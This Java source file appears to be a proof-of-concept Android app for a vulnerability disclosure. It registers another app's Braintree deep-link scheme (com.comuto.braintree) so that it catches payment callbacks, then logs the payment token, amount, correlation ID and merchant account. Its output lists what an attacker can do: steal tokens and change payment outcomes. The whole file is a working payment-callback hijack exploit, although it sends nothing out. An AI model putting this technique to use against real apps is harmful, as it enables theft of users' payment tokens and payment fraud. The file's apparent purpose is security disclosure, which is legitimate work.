package com.comuto_poc;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import java.util.Date;
import java.text.SimpleDateFormat;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private TextView logTextView;
    private StringBuilder log = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        logTextView = findViewById(R.id.logTextView);

        // Check if launched from deep link
        handleIntent(getIntent());

        logMessage("🚨 Payment Hijack POC Active");
        logMessage("📱 Registered: com.comuto.braintree scheme");
        logMessage("⏰ Waiting for payment callbacks...");
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleIntent(intent);
    }

    private void handleIntent(Intent intent) {
        if (intent != null && intent.getAction() != null &&
                intent.getAction().equals(Intent.ACTION_VIEW)) {

            Uri data = intent.getData();
            if (data != null && "com.comuto.braintree".equals(data.getScheme())) {
                interceptPaymentCallback(data);
            }
        }
    }

    private void interceptPaymentCallback(Uri paymentUri) {
        String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                .format(new Date());

        logMessage("\n=== PAYMENT INTERCEPTED ===");
        logMessage("⏰ Time: " + timestamp);
        logMessage("🔗 Full URI: " + paymentUri.toString());

        // Parse payment parameters
        String path = paymentUri.getPath();
        String token = paymentUri.getQueryParameter("token");
        String amount = paymentUri.getQueryParameter("amount");
        String currency = paymentUri.getQueryParameter("currency");
        String intent = paymentUri.getQueryParameter("intent");
        String correlationId = paymentUri.getQueryParameter("correlation_id");
        String merchantAccountId = paymentUri.getQueryParameter("merchant_account_id");

        logMessage("📍 Path: " + path);

        if (token != null) {
            logMessage("💰 Payment Token: " + token);
            logMessage("💳 Amount: " + amount + " " + currency);
            logMessage("🎯 Intent: " + intent);
        }

        if (correlationId != null) {
            logMessage("🆔 Correlation ID: " + correlationId);
        }

        if (merchantAccountId != null) {
            logMessage("🏢 Merchant Account: " + merchantAccountId);
        }

        // Check for error scenarios
        String errorCode = paymentUri.getQueryParameter("error_code");
        String errorMessage = paymentUri.getQueryParameter("error_message");

        if (errorCode != null) {
            logMessage("❌ Payment Error: " + errorCode);
            logMessage("📝 Error Message: " + errorMessage);
        }

        logMessage("=== END INTERCEPTION ===");

        // Demonstrate manipulation capability
        logMessage("\n🔓 ATTACKER CAN:");
        logMessage("• Steal payment tokens");
        logMessage("• Mark failed payments as successful");
        logMessage("• Mark successful payments as failed");
        logMessage("• Extract merchant account details");
        logMessage("• Capture risk correlation data");
    }

    private void logMessage(String message) {
        log.append(message).append("\n");
        logTextView.setText(log.toString());
    }
}